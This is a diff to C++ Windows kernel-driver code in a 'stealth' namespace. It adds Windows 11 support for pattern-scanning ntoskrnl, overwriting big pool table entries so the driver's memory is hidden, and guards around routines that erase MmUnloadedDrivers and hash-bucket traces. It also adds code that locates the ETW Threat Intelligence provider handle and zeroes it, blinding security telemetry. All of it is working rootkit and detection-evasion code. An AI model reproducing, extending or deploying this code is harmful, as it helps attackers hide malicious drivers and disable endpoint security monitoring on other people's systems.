@@ -153,7 +153,7 @@ namespace stealth {
         if (_RtlGetVersion && NT_SUCCESS(_RtlGetVersion(&version_info))) {
             g_NtBuildNumber = version_info.dwBuildNumber;
         } else {
-            g_NtBuildNumber = 19045;
+            g_NtBuildNumber = 0;
         }
 
         KeMemoryBarrier();
@@ -163,6 +163,10 @@ namespace stealth {
 
     __forceinline BOOLEAN IsWindows11() {
         return GetNtBuildNumber() >= 22000;
+    }
+
+    __forceinline BOOLEAN IsNtBuildKnown() {
+        return GetNtBuildNumber() != 0;
     }
 
     __forceinline BOOLEAN IsWindows11_24H2OrNewer() {
@@ -180,6 +184,7 @@ namespace stealth {
 
     inline PPOOL_TRACKER_BIG_PAGES* g_PoolBigPageTable = nullptr;
     inline SIZE_T* g_PoolBigPageTableSize = nullptr;
+    inline SIZE_T g_BigPoolEntryStride = sizeof(POOL_TRACKER_BIG_PAGES);
     inline volatile LONG g_BigPoolResolved = 0;
 
     inline bool SetupStealthFunctions() {
@@ -386,6 +391,99 @@ namespace stealth {
             if (result) return result;
         }
         return nullptr;
+    }
+
+    __forceinline bool NtSectionContains(PVOID ntBase, PVOID address, SIZE_T bytes, ULONG requiredCharacteristics) {
+        if (!ntBase || !address || bytes == 0 || !_MmIsAddressValid(ntBase) || !_MmIsAddressValid(address))
+            return false;
+
+        __try {
+            PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(ntBase);
+            if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+                return false;
+
+            PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
+                static_cast<UCHAR*>(ntBase) + dos->e_lfanew);
+            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
+                return false;
+
+            ULONG_PTR target = reinterpret_cast<ULONG_PTR>(address);
+            if (target + bytes < target)
+                return false;
+
+            PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
+            for (USHORT i = 0; i < nt->FileHeader.NumberOfSections; ++i) {
+                if ((sections[i].Characteristics & requiredCharacteristics) != requiredCharacteristics)
+                    continue;
+
+                SIZE_T sectionSize = sections[i].Misc.VirtualSize;
+                if (sectionSize == 0)
+                    sectionSize = sections[i].SizeOfRawData;
+                if (sectionSize == 0)
+                    continue;
+
+                ULONG_PTR start = reinterpret_cast<ULONG_PTR>(ntBase) + sections[i].VirtualAddress;
+                ULONG_PTR end = start + sectionSize;
+                if (end < start)
+                    continue;
+
+                if (target >= start && target + bytes <= end)
+                    return true;
+            }
+        } __except (EXCEPTION_EXECUTE_HANDLER) {
+            return false;
+        }
+
+        return false;
+    }
+
+    __forceinline bool IsKernelPointerLike(ULONGLONG value) {
+        return value == 0 || value == 1 || value >= 0xFFFF800000000000ULL;
+    }
+
+    __forceinline bool ValidateBigPoolTableSample(PVOID table, ULONGLONG tableSize) {
+        if (!table || tableSize == 0 || tableSize > 0x100000ULL || !_MmIsAddressValid(table))
+            return false;
+
+        ULONG probes = tableSize < 64 ? static_cast<ULONG>(tableSize) : 64;
+        if (probes == 0)
+            return false;
+
+        __try {
+            for (ULONG i = 0; i < probes; ++i) {
+                volatile UCHAR* entry = static_cast<volatile UCHAR*>(table) + (static_cast<SIZE_T>(i) * 0x20);
+                if (!_MmIsAddressValid((PVOID)entry) || !_MmIsAddressValid((PVOID)(entry + 0x1F)))
+                    return false;
+
+                ULONGLONG va = *reinterpret_cast<volatile ULONGLONG*>(entry);
+                ULONGLONG numberOfBytes = *reinterpret_cast<volatile ULONGLONG*>(entry + 0x10);
+                if (!IsKernelPointerLike(va & ~1ULL))
+                    return false;
+                if (numberOfBytes > 0x100000000ULL)
+                    return false;
+            }
+            return true;
+        } __except (EXCEPTION_EXECUTE_HANDLER) {
+            return false;
+        }
+    }
+
+    __forceinline bool ProviderHandleTargetIsSane(PVOID ntBase, PVOID handle, UINT64* currentValue) {
+        if (currentValue)
+            *currentValue = 0;
+        if (!handle || (reinterpret_cast<ULONG_PTR>(handle) & (sizeof(UINT64) - 1)) != 0)
+            return false;
+        if (!NtSectionContains(ntBase, handle, sizeof(UINT64), IMAGE_SCN_MEM_WRITE))
+            return false;
+
+        __try {
+            UINT64 value = *static_cast<volatile UINT64*>(handle);
+            if (currentValue)
+                *currentValue = value;
+            return value == 0 || value >= 0xFFFF800000000000ULL;
+        } __except (EXCEPTION_EXECUTE_HANDLER) {
+            return false;
+        }
     }
 
     __forceinline bool SafeWriteMemory(PVOID dest, PVOID src, SIZE_T len) {
@@ -636,6 +734,132 @@ namespace stealth {
         return true;
     }
 
+    inline bool ResolveBigPoolTableWin11(PVOID ntBase) {
+        if (!ntBase || !_MmIsAddressValid(ntBase))
+            return false;
+
+        PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(ntBase);
+        if (dos->e_magic != IMAGE_DOS_SIGNATURE)
+            return false;
+
+        PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
+            static_cast<UCHAR*>(ntBase) + dos->e_lfanew);
+        if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
+            return false;
+
+        static const UCHAR patWin11[] = {
+            0x48, 0x8B, 0x15, 0x00, 0x00, 0x00, 0x00,
+            0x4C, 0x8B, 0x05, 0x00, 0x00, 0x00, 0x00,
+            0x48, 0x85, 0xD2
+        };
+
+        PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
+        PVOID selectedTablePtr = nullptr;
+        SIZE_T* selectedSizePtr = nullptr;
+        PVOID selectedTable = nullptr;
+        PVOID selectedFound = nullptr;
+        ULONGLONG selectedSize = 0;
+        ULONG rawCandidates = 0;
+        ULONG validCandidates = 0;
+
+        for (USHORT s = 0; s < nt->FileHeader.NumberOfSections; ++s) {
+            if (!(sections[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
+                continue;
+
+            PVOID sectionBase = static_cast<UCHAR*>(ntBase) + sections[s].VirtualAddress;
+            ULONG sectionSize = sections[s].Misc.VirtualSize;
+            ULONG searchOffset = 0;
+
+            for (;;) {
+                if (searchOffset >= sectionSize)
+                    break;
+
+                PVOID searchBase = static_cast<UCHAR*>(sectionBase) + searchOffset;
+                ULONG remaining = sectionSize - searchOffset;
+                PVOID found = FindPatternSafe(searchBase, remaining, patWin11, "xxx????xxx????xxx");
+                if (!found)
+                    break;
+
+                rawCandidates++;
+                PVOID tablePtr = ResolveRelative(found, 3, 7);
+                PVOID sizePtr = ResolveRelative(static_cast<UCHAR*>(found) + 7, 3, 7);
+                bool globalsValid =
+                    tablePtr && sizePtr &&
+                    NtSectionContains(ntBase, tablePtr, sizeof(PVOID), IMAGE_SCN_MEM_WRITE) &&
+                    NtSectionContains(ntBase, sizePtr, sizeof(SIZE_T), IMAGE_SCN_MEM_WRITE) &&
+                    reinterpret_cast<ULONG_PTR>(sizePtr) == reinterpret_cast<ULONG_PTR>(tablePtr) + sizeof(PVOID);
+
+                PVOID table = nullptr;
+                ULONGLONG tableSize = 0;
+                if (globalsValid) {
+                    __try {
+                        table = *static_cast<PVOID*>(tablePtr);
+                        tableSize = *static_cast<SIZE_T*>(sizePtr);
+                    } __except (EXCEPTION_EXECUTE_HANDLER) {
+                        table = nullptr;
+                        tableSize = 0;
+                    }
+                }
+
+                bool sampleValid = globalsValid && ValidateBigPoolTableSample(table, tableSize);
+                WW_LOG("stealth::ResolveBigPoolTableWin11 candidate section=%u found=%p table_ptr=%p size_ptr=%p table=%p size=%llu globals=%u sample=%u raw=%lu valid_count=%lu",
+                    s,
+                    found,
+                    tablePtr,
+                    sizePtr,
+                    table,
+                    static_cast<unsigned long long>(tableSize),
+                    globalsValid ? 1u : 0u,
+                    sampleValid ? 1u : 0u,
+                    rawCandidates,
+                    validCandidates + (sampleValid ? 1u : 0u));
+
+                if (sampleValid) {
+                    validCandidates++;
+                    if (validCandidates == 1) {
+                        selectedTablePtr = tablePtr;
+                        selectedSizePtr = static_cast<SIZE_T*>(sizePtr);
+                        selectedTable = table;
+                        selectedSize = tableSize;
+                        selectedFound = found;
+                    }
+                }
+
+                ULONG consumed = static_cast<ULONG>(
+                    static_cast<UCHAR*>(found) - static_cast<UCHAR*>(sectionBase)) + 1;
+                if (consumed <= searchOffset || consumed >= sectionSize)
+                    break;
+                searchOffset = consumed;
+            }
+        }
+
+        if (validCandidates != 1 || !selectedTablePtr || !selectedSizePtr || !selectedTable || selectedSize == 0) {
+            WW_LOG("stealth::ResolveBigPoolTableWin11 fail_closed raw=%lu valid=%lu selected_found=%p table_ptr=%p size_ptr=%p table=%p size=%llu build=%lu",
+                rawCandidates,
+                validCandidates,
+                selectedFound,
+                selectedTablePtr,
+                selectedSizePtr,
+                selectedTable,
+                static_cast<unsigned long long>(selectedSize),
+                GetNtBuildNumber());
+            return false;
+        }
+
+        g_PoolBigPageTable = reinterpret_cast<PPOOL_TRACKER_BIG_PAGES*>(selectedTablePtr);
+        g_PoolBigPageTableSize = selectedSizePtr;
+        g_BigPoolEntryStride = 0x20;
+        WW_LOG("stealth::ResolveBigPoolTableWin11 selected found=%p table_ptr=%p size_ptr=%p table=%p size=%llu stride=0x%llx raw=%lu",
+            selectedFound,
+            selectedTablePtr,
+            selectedSizePtr,
+            selectedTable,
+            static_cast<unsigned long long>(selectedSize),
+            static_cast<unsigned long long>(g_BigPoolEntryStride),
+            rawCandidates);
+        return true;
+    }
+
     inline bool ResolveBigPoolTable(PVOID ntBase) {
         LONG state = _InterlockedCompareExchange(&g_BigPoolResolved, 0, 0);
         if (state == 2) {
@@ -656,6 +880,19 @@ namespace stealth {
         if (!GetExecutableSections(ntBase, secCheck, secCheckSz, 1)) {
             _InterlockedExchange(&g_BigPoolResolved, 2);
             return false;
+        }
+
+        if (!IsNtBuildKnown()) {
+            WW_LOG("stealth::ResolveBigPoolTable fail_closed reason=unknown_nt_build");
+            _InterlockedExchange(&g_BigPoolResolved, 2);
+            return false;
+        }
+
+        if (IsWindows11()) {
+            bool resolvedWin11 = ResolveBigPoolTableWin11(ntBase);
+            KeMemoryBarrier();
+            _InterlockedExchange(&g_BigPoolResolved, 2);
+            return resolvedWin11;
         }
 
         static const UCHAR patBigPool[] = {
@@ -730,27 +967,52 @@ namespace stealth {
             tableSize = *g_PoolBigPageTableSize;
         }
 
-        if (tableSize == 0 || tableSize > 0x100000)
+        if (tableSize == 0 || tableSize > 0x100000) {
+            if (IsWindows11()) {
+                WW_LOG("stealth::CleanBigPoolTable fail_closed reason=invalid_table_size table=%p size=%llu stride=0x%llx build=%lu",
+                    table,
+                    static_cast<unsigned long long>(tableSize),
+                    static_cast<unsigned long long>(g_BigPoolEntryStride),
+                    GetNtBuildNumber());
+                return false;
+            }
             tableSize = 0x10000;
+        }
+
+        SIZE_T entryStride = g_BigPoolEntryStride;
+        if (entryStride == 0 || entryStride > 0x20)
+            entryStride = sizeof(POOL_TRACKER_BIG_PAGES);
 
         ULONGLONG driverStart = (ULONGLONG)driverBase;
         ULONGLONG driverEnd = driverStart + driverSize;
+        if (driverEnd <= driverStart)
+            return false;
         bool cleaned = false;
 
         for (SIZE_T i = 0; i < tableSize; i++) {
             __try {
-                PPOOL_TRACKER_BIG_PAGES entry = &table[i];
+                UCHAR* entry = reinterpret_cast<UCHAR*>(table) + (i * entryStride);
 
-                if (!_MmIsAddressValid(entry))
+                if (!_MmIsAddressValid(entry) || !_MmIsAddressValid(entry + sizeof(ULONGLONG) - 1))
                     continue;
 
-                volatile ULONGLONG va = entry->Va;
+                volatile ULONGLONG va = *reinterpret_cast<volatile ULONGLONG*>(entry);
 
                 if (va >= driverStart && va < driverEnd) {
-                    POOL_TRACKER_BIG_PAGES zeroEntry = {};
-                    zeroEntry.Va = 1;
-                    SafeWriteMemory(entry, &zeroEntry, sizeof(zeroEntry));
-                    cleaned = true;
+                    UCHAR zeroEntry[0x20] = {};
+                    ULONGLONG hiddenVa = 1;
+                    RtlCopyMemory(zeroEntry, &hiddenVa, sizeof(hiddenVa));
+                    SIZE_T writeSize = entryStride <= sizeof(zeroEntry) ? entryStride : sizeof(POOL_TRACKER_BIG_PAGES);
+                    if (SafeWriteMemory(entry, zeroEntry, writeSize)) {
+                        WW_LOG("stealth::CleanBigPoolTable entry_hidden index=%llu entry=%p old_va=0x%llx stride=0x%llx write=0x%llx build=%lu",
+                            static_cast<unsigned long long>(i),
+                            entry,
+                            static_cast<unsigned long long>(va),
+                            static_cast<unsigned long long>(entryStride),
+                            static_cast<unsigned long long>(writeSize),
+                            GetNtBuildNumber());
+                        cleaned = true;
+                    }
                 }
             }
             __except (EXCEPTION_EXECUTE_HANDLER) {
@@ -764,6 +1026,17 @@ namespace stealth {
     inline PVOID g_MmUnloadedDriversLock = nullptr;
 
     inline bool CleanMmUnloadedDrivers(PVOID ntBase) {
+        if (!IsNtBuildKnown()) {
+            WW_LOG("stealth::CleanMmUnloadedDrivers fail_closed reason=unknown_nt_build");
+            return false;
+        }
+
+        if (IsWindows11()) {
+            WW_LOG("stealth::CleanMmUnloadedDrivers fail_closed_windows11 build=%lu reason=mm_unloaded_write_path_unverified",
+                GetNtBuildNumber());
+            return false;
+        }
+
         static const UCHAR pat1[] = {
             0x4C, 0x8B, 0x15, 0x00, 0x00, 0x00, 0x00,
             0x4C, 0x8B, 0xC9
@@ -861,6 +1134,17 @@ namespace stealth {
     }
 
     inline bool CleanKernelHashBucketList(PVOID ntBase, UNICODE_STRING* driverName) {
+        if (!IsNtBuildKnown()) {
+            WW_LOG("stealth::CleanKernelHashBucketList fail_closed reason=unknown_nt_build");
+            return false;
+        }
+
+        if (IsWindows11()) {
+            WW_LOG("stealth::CleanKernelHashBucketList fail_closed_windows11 build=%lu reason=hash_bucket_write_path_unverified",
+                GetNtBuildNumber());
+            return false;
+        }
+
         if (!driverName || !driverName->Buffer || driverName->Length == 0)
             return false;
 
@@ -967,6 +1251,109 @@ namespace stealth {
     inline bool DisableEtwThreatIntel(PVOID ntBase) {
         if (!ntBase)
             return false;
+
+        if (!IsNtBuildKnown()) {
+            WW_LOG("stealth::DisableEtwThreatIntel fail_closed reason=unknown_nt_build");
+            return false;
+        }
+
+        if (IsWindows11()) {
+            PIMAGE_DOS_HEADER dos = static_cast<PIMAGE_DOS_HEADER>(ntBase);
+            if (!_MmIsAddressValid(dos) || dos->e_magic != IMAGE_DOS_SIGNATURE)
+                return false;
+
+            PIMAGE_NT_HEADERS64 nt = reinterpret_cast<PIMAGE_NT_HEADERS64>(
+                static_cast<UCHAR*>(ntBase) + dos->e_lfanew);
+            if (!_MmIsAddressValid(nt) || nt->Signature != IMAGE_NT_SIGNATURE)
+                return false;
+
+            static const UCHAR patWin11[] = {
+                0x48, 0x8B, 0x0D, 0x00, 0x00, 0x00, 0x00,
+                0x48, 0x0F, 0x44, 0xF0, 0x48, 0x8B, 0xD6, 0xE8
+            };
+
+            PIMAGE_SECTION_HEADER sections = IMAGE_FIRST_SECTION(nt);
+            PVOID selectedHandle = nullptr;
+            PVOID selectedFound = nullptr;
+            UINT64 selectedValue = 0;
+            ULONG rawCandidates = 0;
+            ULONG validCandidates = 0;
+
+            for (USHORT s = 0; s < nt->FileHeader.NumberOfSections; ++s) {
+                if (!(sections[s].Characteristics & IMAGE_SCN_MEM_EXECUTE))
+                    continue;
+
+                PVOID sectionBase = static_cast<UCHAR*>(ntBase) + sections[s].VirtualAddress;
+                ULONG sectionSize = sections[s].Misc.VirtualSize;
+                ULONG searchOffset = 0;
+
+                for (;;) {
+                    if (searchOffset >= sectionSize)
+                        break;
+
+                    PVOID searchBase = static_cast<UCHAR*>(sectionBase) + searchOffset;
+                    ULONG remaining = sectionSize - searchOffset;
+                    PVOID found = FindPatternSafe(searchBase, remaining, patWin11, "xxx????xxxxxxxx");
+                    if (!found)
+                        break;
+
+                    rawCandidates++;
+                    PVOID handle = ResolveRelative(found, 3, 7);
+                    UINT64 currentValue = 0;
+                    bool valid = ProviderHandleTargetIsSane(ntBase, handle, &currentValue);
+                    WW_LOG("stealth::DisableEtwThreatIntel win11_candidate section=%u found=%p handle=%p valid=%u current=0x%llx raw=%lu valid_count=%lu",
+                        s,
+                        found,
+                        handle,
+                        valid ? 1u : 0u,
+                        static_cast<unsigned long long>(currentValue),
+                        rawCandidates,
+                        validCandidates + (valid ? 1u : 0u));
+
+                    if (valid) {
+                        validCandidates++;
+                        if (validCandidates == 1) {
+                            selectedHandle = handle;
+                            selectedFound = found;
+                            selectedValue = currentValue;
+                        }
+                    }
+
+                    ULONG consumed = static_cast<ULONG>(
+                        static_cast<UCHAR*>(found) - static_cast<UCHAR*>(sectionBase)) + 1;
+                    if (consumed <= searchOffset || consumed >= sectionSize)
+                        break;
+                    searchOffset = consumed;
+                }
+            }
+
+            if (validCandidates != 1 || !selectedHandle) {
+                WW_LOG("stealth::DisableEtwThreatIntel fail_closed_windows11 raw=%lu valid=%lu selected=%p build=%lu",
+                    rawCandidates,
+                    validCandidates,
+                    selectedHandle,
+                    GetNtBuildNumber());
+                return false;
+            }
+
+            if (selectedValue == 0) {
+                WW_LOG("stealth::DisableEtwThreatIntel already_disabled_windows11 found=%p handle=%p build=%lu",
+                    selectedFound,
+                    selectedHandle,
+                    GetNtBuildNumber());
+                return true;
+            }
+
+            ULONG64 zeroHandle = 0;
+            bool writeOk = SafeWriteMemory(selectedHandle, &zeroHandle, sizeof(zeroHandle));
+            WW_LOG("stealth::DisableEtwThreatIntel write_windows11 found=%p handle=%p old=0x%llx ok=%u build=%lu",
+                selectedFound,
+                selectedHandle,
+                static_cast<unsigned long long>(selectedValue),
+                writeOk ? 1u : 0u,
+                GetNtBuildNumber());
+            return writeOk;
+        }
 
         static const UCHAR patThreatInt[] = {
             0x48, 0x83, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00,
